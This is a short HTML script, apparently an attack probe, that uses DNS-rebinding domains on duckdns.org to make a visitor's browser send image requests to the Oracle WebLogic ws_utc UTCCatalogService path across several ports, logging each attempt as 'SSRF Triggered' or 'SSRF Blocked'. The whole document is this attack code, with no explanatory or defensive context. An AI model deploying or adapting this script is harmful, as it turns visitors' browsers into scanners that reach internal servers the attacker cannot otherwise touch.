<script>
  const rebinderDomains = [
    'ssrf1.duckdns.org',
    'ssrf2.duckdns.org',
    'ssrf3.duckdns.org'
  ];
  const ports = [7001, 7002, 8001, 8003, 9001];
  const path = '/ws_utc/services/UTCCatalogService';
  const log = document.getElementById("log");

  for (const rebinder of rebinderDomains) {
    for (const port of ports) {
      const url = `http://${rebinder}:${port}${path}`;
      const fullUrl = `${url}?r=${Math.random().toString(36).substring(2, 10)}`;  // Unique token
      const img = new Image();
      img.src = fullUrl;
      img.onload = () => {
        log.innerText += `✅ SSRF Triggered: ${fullUrl}\n`;
      };
      img.onerror = () => {
        log.innerText += `❌ SSRF Blocked: ${fullUrl}\n`;
      };
      document.body.appendChild(img);
    }
  }
</script>
